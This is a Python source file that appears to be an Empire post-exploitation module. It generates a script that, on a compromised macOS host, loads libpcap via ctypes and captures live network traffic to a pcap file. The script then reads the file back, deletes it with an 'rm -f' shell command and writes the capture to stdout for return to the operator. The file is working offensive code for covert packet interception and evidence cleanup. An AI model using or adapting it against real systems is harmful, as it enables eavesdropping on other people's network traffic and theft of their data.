from builtins import object
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
                 obfuscation_command: str = "") -> str:
        script = '\n'
        for item in ['ctypes','threading','sys','os','errno','base64']:
            script += "import %s \n" % item
        savePath = params['SavePath']
        Debug = params['Debug']
        maxPackets = params['MaxPackets']
        libcPath = params['LibcDylib']
        pcapPath = params['PcapDylib']
        if params['CaptureInterface']:
            script += "INTERFACE = '%s' \n" % params['CaptureInterface']
        else:
            script += "INTERFACE = '' \n"
        script += "DEBUG = %s \n" % Debug
        script += "PCAP_FILENAME = '%s' \n" % savePath
        script += "PCAP_CAPTURE_COUNT = %s \n" % maxPackets
        script += "OSX_PCAP_DYLIB = '%s' \n" % pcapPath
        script += "OSX_LIBC_DYLIB = '%s' \n" % libcPath


        script += R"""
IN_MEMORY = False
PCAP_ERRBUF_SIZE = 256
packet_count_limit = ctypes.c_int(1)
timeout_limit = ctypes.c_int(1000) # In milliseconds 
err_buf = ctypes.create_string_buffer(PCAP_ERRBUF_SIZE)

class bpf_program(ctypes.Structure):
    _fields_ = [("bf_len", ctypes.c_int),("bf_insns", ctypes.c_void_p)]

class pcap_pkthdr(ctypes.Structure):
    _fields_ = [("tv_sec", ctypes.c_long), ("tv_usec", ctypes.c_long), ("caplen", ctypes.c_uint), ("len", ctypes.c_uint)]

class pcap_stat(ctypes.Structure):
    _fields_ = [("ps_recv",ctypes.c_uint), ("ps_drop",ctypes.c_uint), ("ps_ifdrop", ctypes.c_int)]

def pkthandler(pkthdr,packet):
    cp = pkthdr.contents.caplen
    if DEBUG:
        print("packet capture length: " + str(pkthdr.contents.caplen))
        print("packet tottal length: " + str(pkthdr.contents.len))
        print((pkthdr.contents.tv_sec,pkthdr.contents.caplen,pkthdr.contents.len))
        print(packet.contents[:cp])

if DEBUG:
    print("-------------------------------------------")
libc = ctypes.CDLL(OSX_LIBC_DYLIB, use_errno=True)
if not libc:
    if DEBUG:
        print("Error loading C libary: %s" % errno.errorcode[ctypes.get_errno()])
if DEBUG:
    print("* C runtime libary loaded: %s" % OSX_LIBC_DYLIB)
pcap = ctypes.CDLL(OSX_PCAP_DYLIB, use_errno=True)
if not pcap:
    if DEBUG:
        print("Error loading C libary: %s" % errno.errorcode[ctypes.get_errno()])
if DEBUG:
    print("* C runtime libary loaded: %s" % OSX_PCAP_DYLIB)
    print("* C runtime handle at: %s" % pcap)
    print("-------------------------------------------")
if not INTERFACE:
    pcap_lookupdev = pcap.pcap_lookupdev
    pcap_lookupdev.restype = ctypes.c_char_p
    INTERFACE = pcap.pcap_lookupdev()
if DEBUG:
    print("* Device handle at: %s" % INTERFACE)

net = ctypes.c_uint()
mask = ctypes.c_uint()
pcap.pcap_lookupnet(INTERFACE,ctypes.byref(net),ctypes.byref(mask),err_buf)
if DEBUG:
    print("* Device IP to bind: %s" % net)
    print("* Device net mask: %s" % mask)

#pcap_t *pcap_open_live(const char *device, int snaplen,int promisc, int to_ms, char *errbuf)
pcap_open_live = pcap.pcap_open_live
pcap_open_live.restype = ctypes.POINTER(ctypes.c_void_p)
pcap_create = pcap.pcap_create
pcap_create.restype = ctypes.c_void_p
#pcap_handle = pcap.pcap_create(INTERFACE, err_buf)
pcap_handle = pcap.pcap_open_live(INTERFACE, 1024, packet_count_limit, timeout_limit, err_buf)
if DEBUG:
    print("* Live capture device handle at: %s" % pcap_handle) 

pcap_can_set_rfmon = pcap.pcap_can_set_rfmon
pcap_can_set_rfmon.argtypes = [ctypes.c_void_p]
if (pcap_can_set_rfmon(pcap_handle) == 1):
    if DEBUG:
        print("* Can set interface in monitor mode")

pcap_pkthdr_p = ctypes.POINTER(pcap_pkthdr)()
packetdata = ctypes.POINTER(ctypes.c_ubyte*65536)()
#print pcap.pcap_next(pcap_handle,ctypes.byref(pcap_pkthdr_p))
if DEBUG:
    print("-------------------------------------------")
pcap_dump_open = pcap.pcap_dump_open
pcap_dump_open.restype = ctypes.POINTER(ctypes.c_void_p)
pcap_dumper_t = pcap.pcap_dump_open(pcap_handle,PCAP_FILENAME)
if DEBUG:
    print("* Pcap dump handle created: %s" % pcap_dumper_t) 
    print("* Pcap data dump to file: %s" % (PCAP_FILENAME)) 
    print("* Max Packets to capture: %s" % (PCAP_CAPTURE_COUNT))
    print("-------------------------------------------")

# CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
# def pkthandler_callback(pcap_pkthdr,pdata):
#     pcap.pcap_dump(pcap_dumper_t,pcap_pkthdr,pdata)
# cmp_func = CMPFUNC(pkthandler_callback)
# pcap.pcap_loop(pcap_handle, PCAP_CAPTURE_COUNT, cmp_func, 0)

c = 0
while True:
    if (pcap.pcap_next_ex(pcap_handle, ctypes.byref(pcap_pkthdr_p), ctypes.byref(packetdata)) == 1):
        pcap.pcap_dump(pcap_dumper_t,pcap_pkthdr_p,packetdata)
        #pkthandler(pcap_pkthdr_p,packetdata)
        c += 1
    if c > PCAP_CAPTURE_COUNT:
        if DEBUG:
            print("* Max packet count reached!")
        break
if DEBUG:
    print("-------------------------------------------")
    print("* Pcap dump handle now freeing")
pcap.pcap_dump_close(pcap_dumper_t)
if DEBUG:
    print("* Device handle now closing")
if not (pcap.pcap_close(pcap_handle)):
    if DEBUG:
        print("* Device handle failed to close!")
if not IN_MEMORY:
    f = open(PCAP_FILENAME, 'rb')
    data = f.read()
    f.close()
    os.system('rm -f %s' % PCAP_FILENAME)
    sys.stdout.write(data)
"""

        # add any arguments to the end exec

        return script
